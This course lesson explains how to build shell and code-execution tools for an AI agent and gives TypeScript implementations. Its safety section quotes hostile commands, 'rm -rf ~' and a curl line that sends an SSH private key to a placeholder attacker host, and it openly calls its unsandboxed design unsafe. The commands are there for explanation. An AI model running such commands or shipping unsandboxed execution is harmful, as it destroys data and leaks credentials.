# Shell Tool & Code Execution

## Overview

This lesson is about giving your agent a computer. When an agent can execute shell commands and run code, it transforms from a text generator into something that can actually *do things* - like a software engineer sitting at a terminal.

## The Power of Computer Access

The insight behind tools like Claude Code, Devin, and other agentic coding systems is simple: **give the AI the same tools that programmers use every day**.

When you're solving a problem as a developer, you don't just think - you:
- Run commands to explore the system (`ls`, `cat`, `grep`)
- Execute code to test hypotheses
- Install packages and dependencies
- Run builds and tests
- Interact with APIs and services

An agent without computer access can only *tell you* what to do. An agent *with* computer access can actually do it.

## Why This Matters

### Code as a Precise Output Format

Text is ambiguous. Code is precise. When an agent generates code and executes it, there's no interpretation gap. The computer does exactly what the code says.

This is why agents that can write and run code are so much more capable:
- Generate a Python script to process a CSV - then actually run it
- Write a bash command to find files - then execute it and use the results
- Create a visualization - then render it and show the output

### Self-Verification Through Execution

When an agent can run its own code, it gets immediate feedback. If the code fails, it sees the error. It can iterate, debug, and fix issues - just like a human developer.

This creates a tight feedback loop:
1. Agent generates code
2. Agent executes code
3. Agent sees output (or error)
4. Agent adjusts and tries again

Without execution, the agent is flying blind. With execution, it can self-correct.

### Extending Capabilities Infinitely

A shell command tool doesn't just give the agent one capability - it gives access to *everything* the terminal can do:
- File system operations
- Network requests (`curl`, `wget`)
- Package management (`npm`, `pip`)
- Git operations
- Docker commands
- Database queries
- And anything else you can run from a command line

You don't need to build a tool for every possible action. You build one shell tool and the agent can figure out the rest.

## Two Approaches: Shell vs Code Execution

We implement two complementary tools:

### Shell Tool (`runCommand`)
Direct access to the terminal. The agent provides a command string, and we execute it via the shell.

**Best for:**
- Quick system operations
- File exploration
- Running existing scripts/binaries
- Git commands
- Package management

### Code Execution Tool (`executeCode`)
A higher-level abstraction. The agent provides code in a specific language, and we handle writing it to a temp file and executing with the appropriate runtime.

**Best for:**
- Multi-step computations
- Data processing
- Complex logic that's easier to express in code
- When the agent needs to "think out loud" with executable code

### Why Both?

The shell tool is lower-level and more flexible. The code execution tool is more structured and language-aware.

In practice, agents benefit from both:
- Use `runCommand` for quick operations: `ls -la`, `git status`, `npm install`
- Use `executeCode` for computation: data analysis, algorithms, transformations

Some teams only implement the shell tool and let the agent write code to files, then execute those files via shell commands. That works too, but the dedicated code execution tool provides a cleaner interface for "run this code" vs "run this command".

## Safety Considerations

Giving an agent shell access is powerful - and dangerous. Consider:

- **Destructive commands**: `rm -rf /`, `DROP TABLE`, etc.
- **Resource exhaustion**: Infinite loops, fork bombs
- **Data exfiltration**: Sending sensitive data to external servers
- **Privilege escalation**: `sudo` commands, accessing protected resources

### Our Approach: Simple but Unsafe

The implementation in this course runs commands **directly on your host machine** with your user's full permissions. This is intentional - it keeps the code simple so we can focus on the agent architecture, not infrastructure.

**This is NOT production-ready.** If an agent decides to run `rm -rf ~` or `curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`, it will succeed. You are trusting the model completely.

For learning and local development, this is fine. You're watching the agent, you can Ctrl+C, and the worst case is you break your own machine.

### Production: Sandboxed Execution

Real code execution systems use **sandboxing** - isolated environments that limit what code can do:

**Container Isolation (Docker, gVisor, Firecracker)**
- Code runs in a disposable container
- Filesystem is ephemeral - nothing persists after execution
- Process isolation prevents escaping to host

**Network Isolation**
- No internet access by default
- Can't phone home to external servers
- Can't access internal network resources
- Anthropic's code execution tool: "Internet access is completely disabled for security"

**Resource Limits**
- CPU time limits (kill after N seconds)
- Memory caps (5GB typical)
- Disk quotas
- Process count limits (prevent fork bombs)

**Seccomp/AppArmor Profiles**
- Restrict which system calls are allowed
- Block dangerous operations at kernel level
- Even if code tries `rm -rf /`, the syscall is denied

**Ephemeral Environments**
- Each execution gets a fresh environment
- State doesn't persist between executions
- Malicious code can't "install" backdoors

Claude Code, for example, uses a sandboxing architecture that:
- Isolates bash execution with filesystem and network controls
- Automatically allows safe operations
- Blocks known malicious patterns
- Asks permission only for ambiguous cases

The key insight: **even if prompt injection succeeds, the damage is contained**. A compromised agent in a sandbox can't steal your SSH keys or exfiltrate data.

### When to Use What

| Scenario | Approach |
|----------|----------|
| Local development | Direct execution (our approach) |
| Learning/courses | Direct execution with supervision |
| Internal tools | Sandboxing recommended |
| User-facing products | Mandatory sandboxing |
| Processing untrusted input | Strict sandboxing + allowlists |

## Code

### src/agent/tools/shell.ts

The shell tool executes arbitrary commands using `shelljs`:

```typescript
import { tool } from "ai";
import { z } from "zod";
import shell from "shelljs";

/**
 * Run a shell command
 */
export const runCommand = tool({
  description:
    "Execute a shell command and return its output. Use this for system operations, running scripts, or interacting with the operating system.",
  inputSchema: z.object({
    command: z.string().describe("The shell command to execute"),
  }),
  execute: async ({ command }: { command: string }) => {
    const result = shell.exec(command, { silent: true });

    let output = "";
    if (result.stdout) {
      output += result.stdout;
    }
    if (result.stderr) {
      output += result.stderr;
    }

    if (result.code !== 0) {
      return `Command failed (exit code ${result.code}):\n${output}`;
    }

    return output || "Command completed successfully (no output)";
  },
});
```

Key implementation details:
- `silent: true` prevents output from going directly to console
- We capture both stdout and stderr
- Non-zero exit codes are reported as failures
- Empty output gets a confirmation message

### src/agent/tools/codeExecution.ts

The code execution tool is a composite tool - it does multiple steps internally:

```typescript
import { tool } from "ai";
import { z } from "zod";
import fs from "fs/promises";
import path from "path";
import os from "os";
import shell from "shelljs";

/**
 * Execute code by writing to temp file and running it
 * This is a composite tool that demonstrates doing multiple steps internally
 * vs letting the model orchestrate separate tools (writeFile + runCommand)
 */
export const executeCode = tool({
  description:
    "Execute code for anything you need compute for. Supports JavaScript (Node.js), Python, and TypeScript. Returns the output of the execution.",
  inputSchema: z.object({
    code: z.string().describe("The code to execute"),
    language: z
      .enum(["javascript", "python", "typescript"])
      .describe("The programming language of the code")
      .default("javascript"),
  }),
  execute: async ({
    code,
    language,
  }: {
    code: string;
    language: "javascript" | "python" | "typescript";
  }) => {
    // Determine file extension and run command based on language
    const extensions: Record<string, string> = {
      javascript: ".js",
      python: ".py",
      typescript: ".ts",
    };

    const commands: Record<string, (file: string) => string> = {
      javascript: (file) => `node ${file}`,
      python: (file) => `python3 ${file}`,
      typescript: (file) => `npx tsx ${file}`,
    };

    const ext = extensions[language];
    const getCommand = commands[language];
    const tmpFile = path.join(os.tmpdir(), `code-exec-${Date.now()}${ext}`);

    try {
      // Write code to temp file
      await fs.writeFile(tmpFile, code, "utf-8");

      // Execute the code
      const command = getCommand(tmpFile);
      const result = shell.exec(command, { silent: true });

      let output = "";
      if (result.stdout) {
        output += result.stdout;
      }
      if (result.stderr) {
        output += result.stderr;
      }

      if (result.code !== 0) {
        return `Execution failed (exit code ${result.code}):\n${output}`;
      }

      return output || "Code executed successfully (no output)";
    } catch (error) {
      const err = error as Error;
      return `Error executing code: ${err.message}`;
    } finally {
      // Clean up temp file
      try {
        await fs.unlink(tmpFile);
      } catch {
        // Ignore cleanup errors
      }
    }
  },
});
```

Key implementation details:
- Supports multiple languages with different runtimes
- Uses temp directory to avoid polluting working directory
- Cleans up temp files in `finally` block
- TypeScript executed via `tsx` for seamless TS execution
- This is a "composite tool" - it does what could be 2+ tool calls (write file, execute) in one

### src/agent/tools/index.ts

Register both tools in the tools index:

```typescript
import { readFile, writeFile, listFiles, deleteFile } from "./file.ts";
import { runCommand } from "./shell.ts";
import { executeCode } from "./codeExecution.ts";
import { webSearch } from "./webSearch.ts";

// All tools combined for the agent
export const tools = {
  readFile,
  writeFile,
  listFiles,
  deleteFile,
  runCommand,
  executeCode,
  webSearch,
};

// Export individual tools for selective use in evals
export { readFile, writeFile, listFiles, deleteFile } from "./file.ts";
export { runCommand } from "./shell.ts";
export { executeCode } from "./codeExecution.ts";
export { webSearch } from "./webSearch.ts";

// Tool sets for evals
export const fileTools = {
  readFile,
  writeFile,
  listFiles,
  deleteFile,
};

export const shellTools = {
  runCommand,
};
```

## Composite Tools vs Orchestrated Tools

The `executeCode` tool is an interesting design choice. We could have let the agent:
1. Call `writeFile` to create a temp file
2. Call `runCommand` to execute it
3. Call `deleteFile` to clean up

Instead, we bundle all three steps into one tool. Trade-offs:

**Composite Tool (what we did):**
- Fewer round trips to the model
- Agent doesn't need to know about temp files
- Cleaner mental model: "execute this code"
- Less flexibility - agent can't customize intermediate steps

**Orchestrated (let agent coordinate):**
- Agent has full control over each step
- Can inspect intermediate results
- More tokens/latency (multiple tool calls)
- Agent might forget cleanup

For "execute code" the composite approach makes sense. The intermediate steps aren't interesting - we just want the output. For more complex workflows, letting the agent orchestrate may be better.


## Sources

- [Claude Code: Anthropic's Agent in Your Terminal](https://www.latent.space/p/claude-code)
- [Code execution tool - Claude API](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- [Building agents with the Claude Agent SDK](https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk)
- [Claude Code: Best practices for agentic coding](https://www.anthropic.com/engineering/claude-code-best-practices)
- [Making Claude Code more secure with sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
